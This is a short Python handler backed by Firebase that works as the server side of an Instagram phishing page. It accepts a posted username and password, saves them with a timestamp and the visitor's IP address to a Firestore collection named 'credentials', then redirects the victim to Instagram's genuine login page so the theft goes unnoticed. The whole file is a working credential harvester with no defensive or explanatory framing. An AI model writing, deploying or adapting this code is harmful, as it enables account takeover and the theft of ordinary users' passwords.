import firebase_admin
from firebase_admin import credentials, firestore, initialize_app
from datetime import datetime
from flask import Response
import json
import os

# Initialize Firebase once
if not firebase_admin._apps:
    cred = credentials.Certificate(json.loads(os.environ['FIREBASE_CONFIG']))
    initialize_app(cred)

db = firestore.client()

def handler(request):
    if request.method == 'POST':
        data = request.form
        username = data.get('username')
        password = data.get('password')
        
        if username and password:
            doc_ref = db.collection('credentials').document()
            doc_ref.set({
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat(),
                'ip_address': request.headers.get('X-Forwarded-For', '')
            })
        
        return Response('', status=302, headers={
            'Location': 'https://www.instagram.com/accounts/login/'
        })
    
    return Response('Method not allowed', status=405)